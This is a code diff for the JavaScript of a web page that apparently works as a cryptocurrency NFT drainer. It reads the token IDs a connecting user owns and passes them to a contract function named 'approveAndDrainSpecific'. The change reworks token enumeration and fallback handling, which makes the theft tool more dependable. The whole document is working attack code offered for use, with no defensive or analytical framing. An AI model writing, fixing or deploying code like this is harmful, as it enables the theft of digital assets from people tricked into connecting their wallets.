@@ -124,8 +124,7 @@
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
       "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
-      "function name() view returns (string)",
-      "function tokensOwned(address owner) view returns (uint256[])"
+      "function name() view returns (string)"
     ];
     const drainerABI = [
       "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
@@ -199,37 +198,28 @@
         status.innerText = "🚨 Approving and draining NFTs...";
         const user = await signer.getAddress();
 
-        // Gather owned token IDs with fallback
+        // Gather owned token IDs using tokenOfOwnerByIndex
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
           const balance = await contract.balanceOf(user);
           let ids = [];
           if (balance > 0) {
-            try {
-              // Try tokenOfOwnerByIndex first
-              for (let i = 0; i < balance; i++) {
+            for (let i = 0; i < balance; i++) {
+              try {
                 const tokenId = await contract.tokenOfOwnerByIndex(user, i);
                 ids.push(Number(tokenId));
-              }
-            } catch (e) {
-              console.warn(`tokenOfOwnerByIndex failed for ${contractAddr}:`, e);
-              // Fallback to tokensOwned if available
-              try {
-                const ownedIds = await contract.tokensOwned(user);
-                ids = ownedIds.map(id => Number(id));
-              } catch (e2) {
-                console.warn(`tokensOwned failed for ${contractAddr}:`, e2);
-                // Last resort: prompt for hardcoded IDs
-                ids = [0]; // Placeholder
+              } catch (e) {
+                console.warn(`tokenOfOwnerByIndex failed for ${contractAddr} at index ${i}:`, e);
+                ids.push(0); // Fallback to 0 if enumeration fails
               }
             }
           }
-          tokenIdMatrix.push(ids.length > 0 && ids[0] !== 0 ? ids : [0]); // Fallback to [0] if invalid
+          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Use [0] as placeholder if no valid IDs
         }
 
         // Check if tokenIdMatrix has valid data
-        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr[0] !== 0);
+        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr.some(id => id !== 0));
         if (!hasValidIds) {
           status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs (e.g., [[1,2],[3,4]]) in the script.";
           return;
